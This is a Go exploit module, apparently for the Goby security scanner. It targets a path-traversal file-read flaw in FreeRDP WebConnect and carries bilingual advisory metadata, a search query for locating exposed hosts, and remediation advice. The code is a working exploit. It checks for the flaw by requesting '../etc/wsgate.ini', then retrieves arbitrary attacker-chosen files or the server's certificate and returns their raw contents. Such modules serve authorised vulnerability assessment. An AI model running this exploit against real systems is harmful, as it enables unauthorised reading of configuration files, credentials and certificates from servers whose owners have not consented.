package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "FreeRDP WebConnect Url Path File Read Vulnerability",
    "Description": "<p>FreeRDP WebConnect is an open source HTML5 agent that provides Web access to any Windows server and workstation using RDP.</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Product": "FreeRDP-WebConnect",
    "Homepage": "https://github.com/FreeRDP/FreeRDP-WebConnect",
    "DisclosureDate": "2021-01-13",
    "Author": "2075068490@qq.com",
    "FofaQuery": "body=\"css/vkb.css\" || body=\"Advanced session parameters\"",
    "GobyQuery": "body=\"css/vkb.css\" || body=\"Advanced session parameters\"",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://github.com/FreeRDP/FreeRDP-WebConnect\">https://github.com/FreeRDP/FreeRDP-WebConnect</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "filePath,ini,cer",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "",
            "show": "attackType=filePath"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "FreeRDP WebConnect Url 路径文件读取漏洞",
            "Product": " FreeRDP-WebConnect",
            "Description": "<p>FreeRDP-WebConnect 是一个开源HTML5代理，它提供对使用RDP的任何Windows服务器和工作站的Web访问。<br></p><p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://github.com/FreeRDP/FreeRDP-WebConnect\" target=\"_blank\">https://github.com/FreeRDP/FreeRDP-WebConnect</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "FreeRDP WebConnect Url Path File Read Vulnerability",
            "Product": "FreeRDP-WebConnect",
            "Description": "<p>FreeRDP WebConnect is an open source HTML5 agent that provides Web access to any Windows server and workstation using RDP.<br></p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://github.com/FreeRDP/FreeRDP-WebConnect\" target=\"_blank\">https://github.com/FreeRDP/FreeRDP-WebConnect</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10856"
}`

	sendPayload531795fdgdq := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewGetRequestConfig("/" + filePath)
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, singleScanConfig *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayload531795fdgdq(hostInfo, `../etc/wsgate.ini`)
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "[global]")
		},
		func(expResult *jsonvul.ExploitResult, singleScanConfig *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := singleScanConfig.Params["attackType"].(string) // filePath,ini
			var filePath string
			if attackType == "filePath" {
				filePath = singleScanConfig.Params["filePath"].(string)
			} else if attackType == "ini" {
				filePath = `../etc/wsgate.ini`
			} else if attackType == "cer" {
				filePath = `../etc/server.cer`
			} else {
				expResult.Output = "不存在的利用方式"
				return expResult
			}
			if filePath == "" {
				expResult.Output = "filePath 不能为空"
				return expResult
			}
			resp, err := sendPayload531795fdgdq(expResult.HostInfo, filePath)
			if err != nil {
				expResult.Output = err.Error()
				return expResult
			}
			if resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Header.Get("Content-Type"), "application/octet-stream") {
				expResult.Output = resp.RawBody
				expResult.Success = true
				return expResult
			}
			expResult.Output = "不存在该漏洞"
			return expResult
		},
	))
}
